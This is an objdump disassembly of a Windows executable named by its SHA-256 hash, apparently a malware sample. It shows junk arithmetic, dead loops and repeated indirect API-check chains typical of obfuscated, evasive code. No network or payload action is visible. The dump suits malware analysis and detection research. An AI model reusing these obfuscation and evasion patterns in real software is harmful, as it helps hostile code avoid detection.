
801e45a4e758ea3628f6d177d9b36a550a8f24ab16d0662b056cfa2ebdc607cf.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xcc
  401009:	xor    DWORD PTR ds:0x42d014,0x42a000
  401013:	push   esi
  401014:	movzx  esi,WORD PTR ds:0x429014
  40101b:	sub    DWORD PTR ds:0x42a018,esi
  401021:	mov    esi,DWORD PTR ds:0x42ed49
  401027:	push   0x8
  401029:	push   0x42e545
  40102e:	and    DWORD PTR ds:0x42c010,0x110f
  401038:	call   esi
  40103a:	test   eax,eax
  40103c:	mov    DWORD PTR ds:0x42a018,0x6e1c
  401046:	je     0x40105d
  40104c:	adc    DWORD PTR ds:0x42a014,0x429000
  401056:	xor    eax,eax
  401058:	jmp    0x4029a4
  40105d:	push   edi
  40105e:	push   0x42e555
  401063:	xor    edi,edi
  401065:	and    DWORD PTR ds:0x42c004,0x42d018
  40106f:	inc    edi
  401070:	push   edi
  401071:	push   edi
  401072:	call   DWORD PTR ds:0x42ed79
  401078:	xor    DWORD PTR ds:0x42d01c,0x429020
  401082:	test   eax,eax
  401084:	mov    DWORD PTR ds:0x42c004,0x42a7
  40108e:	je     0x4010a5
  401094:	xor    eax,eax
  401096:	mov    DWORD PTR ds:0x42a018,0x32e7
  4010a0:	jmp    0x4029a3
  4010a5:	sbb    DWORD PTR ds:0x42a010,0x2663
  4010af:	push   ebx
  4010b0:	and    DWORD PTR ds:0x42d008,0x0
  4010ba:	mov    ebx,DWORD PTR ds:0x42d008
  4010c0:	inc    ebx
  4010c1:	mov    DWORD PTR ds:0x42d008,ebx
  4010c7:	cmp    DWORD PTR ds:0x42d008,0xb
  4010ce:	jne    0x4010e4
  4010d4:	push   0x2cfb
  4010d9:	push   0x7de9
  4010de:	call   DWORD PTR ds:0x42ed35
  4010e4:	cmp    DWORD PTR ds:0x42d008,0xa
  4010eb:	jne    0x4010fe
  4010f1:	mov    ebx,DWORD PTR ds:0x42d008
  4010f7:	inc    ebx
  4010f8:	mov    DWORD PTR ds:0x42d008,ebx
  4010fe:	cmp    DWORD PTR ds:0x42d008,0x12
  401105:	jb     0x4010ba
  40110b:	mov    ebx,DWORD PTR ds:0x42ed4d
  401111:	push   0x42e565
  401116:	sub    DWORD PTR ds:0x429014,0x429020
  401120:	push   edi
  401121:	mov    DWORD PTR ds:0x42b01c,0x3048
  40112b:	push   edi
  40112c:	call   ebx
  40112e:	and    DWORD PTR ds:0x42c00c,0x5ead
  401138:	test   eax,eax
  40113a:	jne    0x401e1f
  401140:	push   0xc
  401142:	push   0x42e589
  401147:	adc    DWORD PTR ds:0x42c010,0x42d010
  401151:	call   esi
  401153:	test   eax,eax
  401155:	mov    DWORD PTR ds:0x42a01c,0x6b4c
  40115f:	jne    0x401e1f
  401165:	push   0x7
  401167:	push   0x42e59d
  40116c:	call   esi
  40116e:	xor    DWORD PTR ds:0x429028,0x6216
  401178:	test   eax,eax
  40117a:	jne    0x401e1f
  401180:	add    DWORD PTR ds:0x429004,0x14dc
  40118a:	push   0x8
  40118c:	and    DWORD PTR ds:0x42c00c,0x42a000
  401196:	push   0x42e5ad
  40119b:	add    DWORD PTR ds:0x42a018,0x317f
  4011a5:	call   esi
  4011a7:	test   eax,eax
  4011a9:	mov    DWORD PTR ds:0x42c014,0x304b
  4011b3:	jne    0x401e1f
  4011b9:	push   0x42e5bd
  4011be:	xor    DWORD PTR ds:0x42d014,0x42b004
  4011c8:	push   edi
  4011c9:	push   edi
  4011ca:	sub    DWORD PTR ds:0x429010,0x429028
  4011d4:	call   DWORD PTR ds:0x42ed79
  4011da:	not    DWORD PTR ds:0x42b000
  4011e0:	test   eax,eax
  4011e2:	mov    DWORD PTR ds:0x429008,0x4a9f
  4011ec:	jne    0x401e1f
  4011f2:	push   0x42e5cd
  4011f7:	push   edi
  4011f8:	adc    DWORD PTR ds:0x42d000,0x42900c
  401202:	push   edi
  401203:	call   ebx
  401205:	test   eax,eax
  401207:	jne    0x401e1f
  40120d:	xor    DWORD PTR ds:0x429000,0x429010
  401217:	push   0xc
  401219:	and    DWORD PTR ds:0x42b00c,0x6767
  401223:	push   0x42e5f1
  401228:	sub    DWORD PTR ds:0x42a010,0x429018
  401232:	call   esi
  401234:	sub    DWORD PTR ds:0x429010,0x42a010
  40123e:	test   eax,eax
  401240:	jne    0x401e1f
  401246:	push   0x7
  401248:	push   0x42e605
  40124d:	and    DWORD PTR ds:0x42c004,0x42b014
  401257:	call   esi
  401259:	test   eax,eax
  40125b:	mov    DWORD PTR ds:0x42c014,0x7e03
  401265:	jne    0x401e1f
  40126b:	and    DWORD PTR ds:0x429020,0x42d000
  401275:	push   0x8
  401277:	sbb    DWORD PTR ds:0x42a008,0x42901c
  401281:	push   0x42e615
  401286:	add    DWORD PTR ds:0x42c01c,0x42d010
  401290:	call   esi
  401292:	test   eax,eax
  401294:	mov    DWORD PTR ds:0x429008,0x7503
  40129e:	jne    0x401e1f
  4012a4:	push   0x42e625
  4012a9:	and    DWORD PTR ds:0x42d008,0x42c000
  4012b3:	push   edi
  4012b4:	push   edi
  4012b5:	call   DWORD PTR ds:0x42ed79
  4012bb:	or     DWORD PTR ds:0x42c01c,0x42d000
  4012c5:	test   eax,eax
  4012c7:	jne    0x401e1f
  4012cd:	add    DWORD PTR ds:0x42b018,0x42d004
  4012d7:	push   0x42e635
  4012dc:	and    DWORD PTR ds:0x42900c,0x42a018
  4012e6:	push   edi
  4012e7:	push   edi
  4012e8:	and    DWORD PTR ds:0x42c018,0x4f5c
  4012f2:	call   ebx
  4012f4:	xor    DWORD PTR ds:0x42b00c,0x577f
  4012fe:	test   eax,eax
  401300:	jne    0x401e1f
  401306:	push   0xc
  401308:	push   0x42e659
  40130d:	xor    DWORD PTR ds:0x429018,0x2dc5
  401317:	call   esi
  401319:	mov    DWORD PTR ds:0x42d014,0x790c
  401323:	test   eax,eax
  401325:	mov    DWORD PTR ds:0x42a014,0x2892
  40132f:	jne    0x401e1f
  401335:	sub    DWORD PTR ds:0x42d004,0x3ee1
  40133f:	push   0x7
  401341:	xor    DWORD PTR ds:0x42a01c,0x42b018
  40134b:	push   0x42e66d
  401350:	and    DWORD PTR ds:0x42c018,0x42d014
  40135a:	call   esi
  40135c:	test   eax,eax
  40135e:	mov    DWORD PTR ds:0x429008,0x4095
  401368:	jne    0x401e1f
  40136e:	sub    DWORD PTR ds:0x42d008,0x42b000
  401378:	push   0x8
  40137a:	adc    DWORD PTR ds:0x42d018,0x42c00c
  401384:	push   0x42e67d
  401389:	xor    DWORD PTR ds:0x42c014,0x7b1e
  401393:	call   esi
  401395:	test   eax,eax
  401397:	mov    DWORD PTR ds:0x42c010,0x4421
  4013a1:	jne    0x401e1f
  4013a7:	push   0x42e68d
  4013ac:	xor    DWORD PTR ds:0x42d018,0x31e9
  4013b6:	push   edi
  4013b7:	push   edi
  4013b8:	dec    DWORD PTR ds:0x42b010
  4013be:	call   DWORD PTR ds:0x42ed79
  4013c4:	test   eax,eax
  4013c6:	mov    DWORD PTR ds:0x429008,0x30d5
  4013d0:	jne    0x401e1f
  4013d6:	push   0x42e69d
  4013db:	push   edi
  4013dc:	adc    DWORD PTR ds:0x42c018,0x42d014
  4013e6:	push   edi
  4013e7:	sbb    DWORD PTR ds:0x429024,0x42b00c
  4013f1:	call   ebx
  4013f3:	xor    DWORD PTR ds:0x42b004,0x3165
  4013fd:	test   eax,eax
  4013ff:	mov    DWORD PTR ds:0x429028,0x3c76
  401409:	jne    0x401e1f
  40140f:	push   0xc
  401411:	or     DWORD PTR ds:0x42d000,0x42c004
  40141b:	push   0x42e6c1
  401420:	call   esi
  401422:	test   eax,eax
  401424:	mov    DWORD PTR ds:0x42d01c,0x6bbc
  40142e:	jne    0x401e1f
  401434:	and    DWORD PTR ds:0x42c018,0x24ff
  40143e:	push   0x7
  401440:	push   0x42e6d5
  401445:	add    DWORD PTR ds:0x42c008,0x429024
  40144f:	call   esi
  401451:	adc    DWORD PTR ds:0x429008,0x42b004
  40145b:	test   eax,eax
  40145d:	jne    0x401e1f
  401463:	push   0x8
  401465:	push   0x42e6e5
  40146a:	or     DWORD PTR ds:0x42a00c,0x2f15
  401474:	call   esi
  401476:	test   eax,eax
  401478:	jne    0x401e1f
  40147e:	push   0x42e6f5
  401483:	push   edi
  401484:	add    DWORD PTR ds:0x42a008,0x52fe
  40148e:	push   edi
  40148f:	call   DWORD PTR ds:0x42ed79
  401495:	sub    DWORD PTR ds:0x429018,0x42c010
  40149f:	test   eax,eax
  4014a1:	mov    DWORD PTR ds:0x42d014,0x5fc2
  4014ab:	jne    0x401e1f
  4014b1:	push   0x42e705
  4014b6:	add    DWORD PTR ds:0x42b014,0x42a00c
  4014c0:	push   edi
  4014c1:	push   edi
  4014c2:	xor    DWORD PTR ds:0x42b00c,0x37e4
  4014cc:	call   ebx
  4014ce:	mov    DWORD PTR ds:0x429000,0x2bcb
  4014d8:	test   eax,eax
  4014da:	jne    0x401e1f
  4014e0:	push   0xc
  4014e2:	push   0x42e729
  4014e7:	call   esi
  4014e9:	and    DWORD PTR ds:0x42b000,0x6be4
  4014f3:	test   eax,eax
  4014f5:	mov    DWORD PTR ds:0x42b00c,0x4954
  4014ff:	jne    0x401e1f
  401505:	or     DWORD PTR ds:0x429004,0x2e1b
  40150f:	push   0x7
  401511:	push   0x42e73d
  401516:	neg    DWORD PTR ds:0x429018
  40151c:	call   esi
  40151e:	or     DWORD PTR ds:0x429004,0x7cc8
  401528:	test   eax,eax
  40152a:	mov    DWORD PTR ds:0x42a000,0x4af4
  401534:	jne    0x401e1f
  40153a:	sub    DWORD PTR ds:0x429020,0x6067
  401544:	push   0x8
  401546:	push   0x42e74d
  40154b:	call   esi
  40154d:	test   eax,eax
  40154f:	jne    0x401e1f
  401555:	xor    DWORD PTR ds:0x429008,0x42a00c
  40155f:	push   0x42e75d
  401564:	push   edi
  401565:	sbb    DWORD PTR ds:0x42a004,0x429028
  40156f:	push   edi
  401570:	adc    DWORD PTR ds:0x42c000,0x42b004
  40157a:	call   DWORD PTR ds:0x42ed79
  401580:	xor    DWORD PTR ds:0x42b01c,0x42d004
  40158a:	test   eax,eax
  40158c:	mov    DWORD PTR ds:0x429004,0x6f0c
  401596:	jne    0x401e1f
  40159c:	sbb    DWORD PTR ds:0x429010,0x42b010
  4015a6:	push   0x42e76d
  4015ab:	push   edi
  4015ac:	xor    DWORD PTR ds:0x42c000,0x17e1
  4015b6:	push   edi
  4015b7:	add    DWORD PTR ds:0x429024,0x42b018
  4015c1:	call   ebx
  4015c3:	sbb    DWORD PTR ds:0x42c004,0x42b018
  4015cd:	test   eax,eax
  4015cf:	jne    0x401e1f
  4015d5:	or     DWORD PTR ds:0x42d008,0x42d000
  4015df:	push   0xc
  4015e1:	push   0x42e791
  4015e6:	adc    DWORD PTR ds:0x42d01c,0x429000
  4015f0:	call   esi
  4015f2:	test   eax,eax
  4015f4:	jne    0x401e1f
  4015fa:	sbb    DWORD PTR ds:0x42b01c,0x35f4
  401604:	push   0x7
  401606:	adc    DWORD PTR ds:0x42d00c,0x4213
  401610:	push   0x42e7a5
  401615:	xor    DWORD PTR ds:0x42b01c,0x728b
  40161f:	call   esi
  401621:	test   eax,eax
  401623:	mov    DWORD PTR ds:0x429010,0x1355
  40162d:	jne    0x401e1f
  401633:	add    DWORD PTR ds:0x42c00c,0x42d000
  40163d:	push   0x8
  40163f:	sub    DWORD PTR ds:0x42d000,0x42a014
  401649:	push   0x42e7b5
  40164e:	xor    DWORD PTR ds:0x42900c,0x42a014
  401658:	call   esi
  40165a:	add    DWORD PTR ds:0x42d018,0x7270
  401664:	test   eax,eax
  401666:	jne    0x401e1f
  40166c:	xor    DWORD PTR ds:0x429028,0x318
  401676:	push   0x42e7c5
  40167b:	not    DWORD PTR ds:0x42b00c
  401681:	push   edi
  401682:	and    DWORD PTR ds:0x429024,0x42d004
  40168c:	push   edi
  40168d:	call   DWORD PTR ds:0x42ed79
  401693:	test   eax,eax
  401695:	jne    0x401e1f
  40169b:	push   0x42e7d5
  4016a0:	push   edi
  4016a1:	push   edi
  4016a2:	xor    DWORD PTR ds:0x42d004,0x42b004
  4016ac:	call   ebx
  4016ae:	sbb    DWORD PTR ds:0x42d01c,0x42a008
  4016b8:	test   eax,eax
  4016ba:	mov    DWORD PTR ds:0x42b008,0x59c6
  4016c4:	jne    0x401e1f
  4016ca:	mov    DWORD PTR ds:0x42a008,0x78fc
  4016d4:	push   0xc
  4016d6:	add    DWORD PTR ds:0x42900c,0x42c018
  4016e0:	push   0x42e7f9
  4016e5:	call   esi
  4016e7:	test   eax,eax
  4016e9:	jne    0x401e1f
  4016ef:	and    DWORD PTR ds:0x42d010,0x3029
  4016f9:	push   0x7
  4016fb:	xor    DWORD PTR ds:0x42d008,0x429020
  401705:	push   0x42e80d
  40170a:	call   esi
  40170c:	sub    DWORD PTR ds:0x42901c,0x49cd
  401716:	test   eax,eax
  401718:	mov    DWORD PTR ds:0x42900c,0x2477
  401722:	jne    0x401e1f
  401728:	push   0x8
  40172a:	push   0x42e81d
  40172f:	call   esi
  401731:	or     DWORD PTR ds:0x42c000,0x42b014
  40173b:	test   eax,eax
  40173d:	jne    0x401e1f
  401743:	sub    DWORD PTR ds:0x429018,0x4202
  40174d:	push   0x42e82d
  401752:	adc    DWORD PTR ds:0x42a000,0x15e
  40175c:	push   edi
  40175d:	push   edi
  40175e:	and    DWORD PTR ds:0x42d008,0x1b79
  401768:	call   DWORD PTR ds:0x42ed79
  40176e:	add    DWORD PTR ds:0x42b008,0x42c000
  401778:	test   eax,eax
  40177a:	mov    DWORD PTR ds:0x429004,0x4fab
  401784:	jne    0x401e1f
  40178a:	add    DWORD PTR ds:0x42b008,0x429018
  401794:	push   0x42e83d
  401799:	push   edi
  40179a:	adc    DWORD PTR ds:0x42d018,0x42b008
  4017a4:	push   edi
  4017a5:	call   ebx
  4017a7:	adc    DWORD PTR ds:0x42b01c,0x42a014
  4017b1:	test   eax,eax
  4017b3:	mov    DWORD PTR ds:0x42b008,0x413c
  4017bd:	jne    0x401e1f
  4017c3:	sub    DWORD PTR ds:0x42a004,0x429004
  4017cd:	push   0xc
  4017cf:	push   0x42e861
  4017d4:	sub    DWORD PTR ds:0x42b014,0x419d
  4017de:	call   esi
  4017e0:	sub    DWORD PTR ds:0x429014,0x429024
  4017ea:	test   eax,eax
  4017ec:	mov    DWORD PTR ds:0x42c018,0x3584
  4017f6:	jne    0x401e1f
  4017fc:	adc    DWORD PTR ds:0x42b014,0x3845
  401806:	push   0x7
  401808:	adc    DWORD PTR ds:0x42b014,0x5918
  401812:	push   0x42e875
  401817:	call   esi
  401819:	or     DWORD PTR ds:0x42b004,0x42a000
  401823:	test   eax,eax
  401825:	jne    0x401e1f
  40182b:	sub    DWORD PTR ds:0x42c010,0x7a9b
  401835:	push   0x8
  401837:	push   0x42e885
  40183c:	call   esi
  40183e:	or     DWORD PTR ds:0x42b018,0x42a018
  401848:	test   eax,eax
  40184a:	mov    DWORD PTR ds:0x42c018,0x6db6
  401854:	jne    0x401e1f
  40185a:	push   0x42e895
  40185f:	push   edi
  401860:	push   edi
  401861:	or     DWORD PTR ds:0x429024,0x42b004
  40186b:	call   DWORD PTR ds:0x42ed79
  401871:	test   eax,eax
  401873:	jne    0x401e1f
  401879:	push   0x42e8a5
  40187e:	mov    DWORD PTR ds:0x42d010,0x708e
  401888:	push   edi
  401889:	mov    DWORD PTR ds:0x42c01c,0x7ef
  401893:	push   edi
  401894:	call   ebx
  401896:	test   eax,eax
  401898:	mov    DWORD PTR ds:0x42a00c,0x3b87
  4018a2:	jne    0x401e1f
  4018a8:	mov    DWORD PTR ds:0x429004,0x503
  4018b2:	push   0xc
  4018b4:	xor    DWORD PTR ds:0x42c00c,0x6b3b
  4018be:	push   0x42e8c9
  4018c3:	call   esi
  4018c5:	test   eax,eax
  4018c7:	mov    DWORD PTR ds:0x42a004,0x812
  4018d1:	jne    0x401e1f
  4018d7:	push   0x7
  4018d9:	sub    DWORD PTR ds:0x42b000,0x42a00c
  4018e3:	push   0x42e8dd
  4018e8:	sub    DWORD PTR ds:0x42d008,0x6a91
  4018f2:	call   esi
  4018f4:	add    DWORD PTR ds:0x429000,0x3ce6
  4018fe:	test   eax,eax
  401900:	mov    DWORD PTR ds:0x42d018,0x1a2
  40190a:	jne    0x401e1f
  401910:	sub    DWORD PTR ds:0x42a008,0x42a010
  40191a:	push   0x8
  40191c:	push   0x42e8ed
  401921:	call   esi
  401923:	sub    DWORD PTR ds:0x42d00c,0x42900c
  40192d:	test   eax,eax
  40192f:	mov    DWORD PTR ds:0x429000,0x18ec
  401939:	jne    0x401e1f
  40193f:	sbb    DWORD PTR ds:0x42a01c,0x42a004
  401949:	push   0x42e8fd
  40194e:	adc    DWORD PTR ds:0x42c010,0x1027
  401958:	push   edi
  401959:	adc    DWORD PTR ds:0x42d014,0x61c0
  401963:	push   edi
  401964:	xor    DWORD PTR ds:0x42d004,0x42b000
  40196e:	call   DWORD PTR ds:0x42ed79
  401974:	and    DWORD PTR ds:0x42b00c,0x54e0
  40197e:	test   eax,eax
  401980:	jne    0x401e1f
  401986:	mov    DWORD PTR ds:0x42b014,0x48d
  401990:	push   0x42e90d
  401995:	xor    DWORD PTR ds:0x42b00c,0x429000
  40199f:	push   edi
  4019a0:	xor    DWORD PTR ds:0x42c008,0x7d0d
  4019aa:	push   edi
  4019ab:	and    DWORD PTR ds:0x42b010,0xad4
  4019b5:	call   ebx
  4019b7:	adc    DWORD PTR ds:0x42b01c,0x42d018
  4019c1:	test   eax,eax
  4019c3:	mov    DWORD PTR ds:0x42a00c,0x2f29
  4019cd:	jne    0x401e1f
  4019d3:	sub    DWORD PTR ds:0x42a010,0x429014
  4019dd:	push   0xc
  4019df:	add    DWORD PTR ds:0x42d004,0x38f3
  4019e9:	push   0x42e931
  4019ee:	sub    DWORD PTR ds:0x42d008,0x531f
  4019f8:	call   esi
  4019fa:	xor    DWORD PTR ds:0x42a00c,0x1332
  401a04:	test   eax,eax
  401a06:	jne    0x401e1f
  401a0c:	add    DWORD PTR ds:0x42d014,0x42b000
  401a16:	push   0x7
  401a18:	push   0x42e945
  401a1d:	adc    DWORD PTR ds:0x429028,0x23cf
  401a27:	call   esi
  401a29:	test   eax,eax
  401a2b:	jne    0x401e1f
  401a31:	push   0x8
  401a33:	add    DWORD PTR ds:0x429020,0x607a
  401a3d:	push   0x42e955
  401a42:	call   esi
  401a44:	or     DWORD PTR ds:0x42c000,0x42b00c
  401a4e:	test   eax,eax
  401a50:	mov    DWORD PTR ds:0x42c00c,0x4ca0
  401a5a:	jne    0x401e1f
  401a60:	sub    DWORD PTR ds:0x429000,0x42d010
  401a6a:	push   0x42e965
  401a6f:	push   edi
  401a70:	and    DWORD PTR ds:0x42901c,0x42a004
  401a7a:	push   edi
  401a7b:	xor    DWORD PTR ds:0x42b018,0x42a008
  401a85:	call   DWORD PTR ds:0x42ed79
  401a8b:	adc    DWORD PTR ds:0x42d004,0x42901c
  401a95:	test   eax,eax
  401a97:	mov    DWORD PTR ds:0x42c010,0x64f7
  401aa1:	jne    0x401e1f
  401aa7:	push   0x42e975
  401aac:	mov    DWORD PTR ds:0x42a014,0x62f7
  401ab6:	push   edi
  401ab7:	push   edi
  401ab8:	call   ebx
  401aba:	add    DWORD PTR ds:0x42a018,0x42d01c
  401ac4:	test   eax,eax
  401ac6:	mov    DWORD PTR ds:0x42c01c,0x72ca
  401ad0:	jne    0x401e1f
  401ad6:	mov    DWORD PTR ds:0x42c01c,0x7760
  401ae0:	push   0xc
  401ae2:	sub    DWORD PTR ds:0x42b018,0x3ed8
  401aec:	push   0x42e999
  401af1:	call   esi
  401af3:	test   eax,eax
  401af5:	mov    DWORD PTR ds:0x42d018,0x4329
  401aff:	jne    0x401e1f
  401b05:	push   0x7
  401b07:	push   0x42e9ad
  401b0c:	call   esi
  401b0e:	add    DWORD PTR ds:0x42b01c,0x42d008
  401b18:	test   eax,eax
  401b1a:	jne    0x401e1f
  401b20:	add    DWORD PTR ds:0x42a008,0x5e0b
  401b2a:	push   0x8
  401b2c:	sub    DWORD PTR ds:0x429018,0x42a00c
  401b36:	push   0x42e9bd
  401b3b:	call   esi
  401b3d:	test   eax,eax
  401b3f:	mov    DWORD PTR ds:0x42d008,0x514f
  401b49:	jne    0x401e1f
  401b4f:	sbb    DWORD PTR ds:0x42b000,0x42d000
  401b59:	push   0x42e9cd
  401b5e:	xor    DWORD PTR ds:0x42c018,0x40e4
  401b68:	push   edi
  401b69:	add    DWORD PTR ds:0x42b010,0x42c000
  401b73:	push   edi
  401b74:	add    DWORD PTR ds:0x42d004,0x42c010
  401b7e:	call   DWORD PTR ds:0x42ed79
  401b84:	mov    DWORD PTR ds:0x42a000,0x51c5
  401b8e:	test   eax,eax
  401b90:	mov    DWORD PTR ds:0x42b000,0x17c8
  401b9a:	jne    0x401e1f
  401ba0:	and    DWORD PTR ds:0x42d014,0x42d010
  401baa:	push   0x42e9dd
  401baf:	push   edi
  401bb0:	push   edi
  401bb1:	call   ebx
  401bb3:	sbb    DWORD PTR ds:0x429010,0x42b014
  401bbd:	test   eax,eax
  401bbf:	mov    DWORD PTR ds:0x42c01c,0x73a3
  401bc9:	jne    0x401e1f
  401bcf:	xor    DWORD PTR ds:0x42c01c,0x6e0
  401bd9:	push   0xc
  401bdb:	adc    DWORD PTR ds:0x429008,0x42c008
  401be5:	push   0x42ea01
  401bea:	adc    DWORD PTR ds:0x42901c,0x2688
  401bf4:	call   esi
  401bf6:	add    DWORD PTR ds:0x42c008,0x63eb
  401c00:	test   eax,eax
  401c02:	mov    DWORD PTR ds:0x429004,0x7742
  401c0c:	jne    0x401e1f
  401c12:	adc    DWORD PTR ds:0x42c014,0x42b008
  401c1c:	push   0x7
  401c1e:	adc    DWORD PTR ds:0x42c008,0x42b010
  401c28:	push   0x42ea15
  401c2d:	call   esi
  401c2f:	test   eax,eax
  401c31:	mov    DWORD PTR ds:0x42900c,0x5c79
  401c3b:	jne    0x401e1f
  401c41:	adc    DWORD PTR ds:0x42d008,0x429000
  401c4b:	push   0x8
  401c4d:	xor    DWORD PTR ds:0x42c008,0x42b014
  401c57:	push   0x42ea25
  401c5c:	sub    DWORD PTR ds:0x42d000,0x42b01c
  401c66:	call   esi
  401c68:	xor    DWORD PTR ds:0x429008,0x42a00c
  401c72:	test   eax,eax
  401c74:	jne    0x401e1f
  401c7a:	push   0x42ea35
  401c7f:	adc    DWORD PTR ds:0x429020,0x1586
  401c89:	push   edi
  401c8a:	push   edi
  401c8b:	and    DWORD PTR ds:0x429008,0x42a014
  401c95:	call   DWORD PTR ds:0x42ed79
  401c9b:	and    DWORD PTR ds:0x42a01c,0x429000
  401ca5:	test   eax,eax
  401ca7:	jne    0x401e1f
  401cad:	push   0x42ea45
  401cb2:	push   edi
  401cb3:	sub    DWORD PTR ds:0x42d000,0x429000
  401cbd:	push   edi
  401cbe:	call   ebx
  401cc0:	test   eax,eax
  401cc2:	jne    0x401e1f
  401cc8:	push   0xc
  401cca:	push   0x42ea69
  401ccf:	sbb    DWORD PTR ds:0x42a004,0x42a014
  401cd9:	call   esi
  401cdb:	test   eax,eax
  401cdd:	mov    DWORD PTR ds:0x42a018,0x57a5
  401ce7:	jne    0x401e1f
  401ced:	sub    DWORD PTR ds:0x42d018,0x45f
  401cf7:	push   0x7
  401cf9:	push   0x42ea7d
  401cfe:	call   esi
  401d00:	test   eax,eax
  401d02:	mov    DWORD PTR ds:0x42a010,0x77f7
  401d0c:	jne    0x401e1f
  401d12:	adc    DWORD PTR ds:0x42a008,0x42900c
  401d1c:	push   0x8
  401d1e:	sub    DWORD PTR ds:0x429008,0x429014
  401d28:	push   0x42ea8d
  401d2d:	and    DWORD PTR ds:0x429008,0x429018
  401d37:	call   esi
  401d39:	test   eax,eax
  401d3b:	mov    DWORD PTR ds:0x429000,0x2cbb
  401d45:	jne    0x401e1f
  401d4b:	and    DWORD PTR ds:0x42d01c,0x42b000
  401d55:	push   0x42ea9d
  401d5a:	or     DWORD PTR ds:0x42b010,0x58c8
  401d64:	push   edi
  401d65:	or     DWORD PTR ds:0x42c00c,0x42a00c
  401d6f:	push   edi
  401d70:	adc    DWORD PTR ds:0x42b004,0x42a01c
  401d7a:	call   DWORD PTR ds:0x42ed79
  401d80:	and    DWORD PTR ds:0x429020,0x42b000
  401d8a:	test   eax,eax
  401d8c:	jne    0x401e1f
  401d92:	or     DWORD PTR ds:0x42c01c,0x42b01c
  401d9c:	push   0x42eaad
  401da1:	push   edi
  401da2:	push   edi
  401da3:	call   ebx
  401da5:	sbb    DWORD PTR ds:0x42901c,0x42c01c
  401daf:	test   eax,eax
  401db1:	mov    DWORD PTR ds:0x429018,0x129d
  401dbb:	jne    0x401e1f
  401dc1:	sbb    DWORD PTR ds:0x42a004,0x14a1
  401dcb:	push   0xc
  401dcd:	push   0x42ead1
  401dd2:	call   esi
  401dd4:	sbb    DWORD PTR ds:0x42c00c,0x67e3
  401dde:	test   eax,eax
  401de0:	mov    DWORD PTR ds:0x42c014,0x5d4a
  401dea:	jne    0x401e1f
  401df0:	sbb    DWORD PTR ds:0x42c00c,0x7769
  401dfa:	push   0x7
  401dfc:	or     DWORD PTR ds:0x42b00c,0x1035
  401e06:	push   0x42eae5
  401e0b:	call   esi
  401e0d:	test   eax,eax
  401e0f:	mov    DWORD PTR ds:0x42d014,0xf4
  401e19:	je     0x401e3a
  401e1f:	sub    DWORD PTR ds:0x42b01c,0x42b000
  401e29:	xor    eax,eax
  401e2b:	mov    DWORD PTR ds:0x42c018,0x7f86
  401e35:	jmp    0x4029a2
  401e3a:	or     esi,DWORD PTR ds:0x429020
  401e40:	mov    DWORD PTR [ebp-0x10],0x0
  401e47:	movzx  esi,BYTE PTR ds:0x42d010
  401e4e:	add    DWORD PTR ds:0x42c004,esi
  401e54:	mov    eax,DWORD PTR [ebp-0x24]
  401e57:	dec    esi
  401e58:	mov    DWORD PTR [ebp-0x24],eax
  401e5b:	mov    ecx,0xf89c85b5
  401e60:	mov    edi,DWORD PTR ds:0x411fc4
  401e66:	mov    esi,DWORD PTR ds:0x411f58
  401e6c:	sub    esi,edi
  401e6e:	imul   edi,DWORD PTR [edi+esi*1]
  401e72:	mov    DWORD PTR [ebp-0x8],ecx
  401e75:	mov    DWORD PTR [ebp-0xc],0xf89c85b2
  401e7c:	and    DWORD PTR ds:0x42a004,0x0
  401e86:	jmp    0x401e98
  401e8b:	mov    edi,DWORD PTR ds:0x42a004
  401e91:	inc    edi
  401e92:	mov    DWORD PTR ds:0x42a004,edi
  401e98:	cmp    DWORD PTR ds:0x42a004,0x1c
  401e9f:	jae    0x401ed2
  401ea5:	cmp    DWORD PTR ds:0x42a004,0x25
  401eac:	jne    0x401ec3
  401eb2:	push   DWORD PTR [ebp-0x14]
  401eb5:	push   0x42a004
  401eba:	push   DWORD PTR [ebp-0x1c]
  401ebd:	call   DWORD PTR ds:0x42ed39
  401ec3:	jmp    0x401e8b
  401ec8:	sbb    DWORD PTR ds:0x42d000,0x3f97
  401ed2:	lea    eax,[ebp-0x34]
  401ed5:	mov    DWORD PTR [ebp-0x28],eax
  401ed8:	mov    esi,DWORD PTR ds:0x429018
  401ede:	and    esi,DWORD PTR ds:0x42901c
  401ee4:	mov    DWORD PTR ds:0x429018,esi
  401eea:	lea    eax,[ebp-0x30]
  401eed:	mov    DWORD PTR [ebp-0x1c],eax
  401ef0:	sub    DWORD PTR ds:0x429018,0x2a07
  401efa:	mov    eax,ds:0x42e435
  401eff:	mov    eax,DWORD PTR [eax+0x1c8]
  401f05:	or     DWORD PTR ds:0x429028,0x42b010
  401f0f:	mov    eax,DWORD PTR [eax]
  401f11:	mov    edx,DWORD PTR [ebp-0x1c]
  401f14:	mov    esi,0x7510896
  401f19:	adc    DWORD PTR ds:0x429014,edi
  401f1f:	xor    eax,esi
  401f21:	mov    edi,0x3272dd
  401f26:	add    eax,edi
  401f28:	mov    DWORD PTR ds:0x42d008,0xdc
  401f32:	mov    DWORD PTR [edx],eax
  401f34:	mov    eax,ds:0x42b000
  401f39:	mov    eax,ds:0x42ebcd
  401f3e:	cmp    eax,0x312bc9f6
  401f43:	jne    0x40206d
  401f49:	xor    eax,0x6ec6
  401f4e:	mov    eax,DWORD PTR [ebp-0x8]
  401f51:	mov    edx,DWORD PTR ds:0x42e435
  401f57:	or     DWORD PTR ds:0x42901c,0x3e24
  401f61:	mov    edx,DWORD PTR [edx+0x198]
  401f67:	or     DWORD PTR ds:0x42b018,edx
  401f6d:	xor    eax,esi
  401f6f:	and    ebx,0x7b5c
  401f75:	add    eax,edi
  401f77:	and    DWORD PTR ds:0x429028,0x0
  401f81:	jmp    0x401f93
  401f86:	mov    ebx,DWORD PTR ds:0x429028
  401f8c:	inc    ebx
  401f8d:	mov    DWORD PTR ds:0x429028,ebx
  401f93:	cmp    DWORD PTR ds:0x429028,0x10
  401f9a:	jae    0x401fc8
  401fa0:	cmp    DWORD PTR ds:0x429028,0x12
  401fa7:	jne    0x401fbd
  401fad:	push   0x42e010
  401fb2:	push   0x42e0c5
  401fb7:	call   DWORD PTR ds:0x42ed3d
  401fbd:	jmp    0x401f86
  401fc2:	sub    DWORD PTR ds:0x42c014,edx
  401fc8:	mov    DWORD PTR [edx],eax
  401fca:	sbb    DWORD PTR ds:0x42c014,edi
  401fd0:	mov    eax,DWORD PTR [ebp-0x8]
  401fd3:	mov    DWORD PTR ds:0x42c018,0x1d
  401fdd:	cmp    DWORD PTR ds:0x42c018,0x0
  401fe4:	je     0x402064
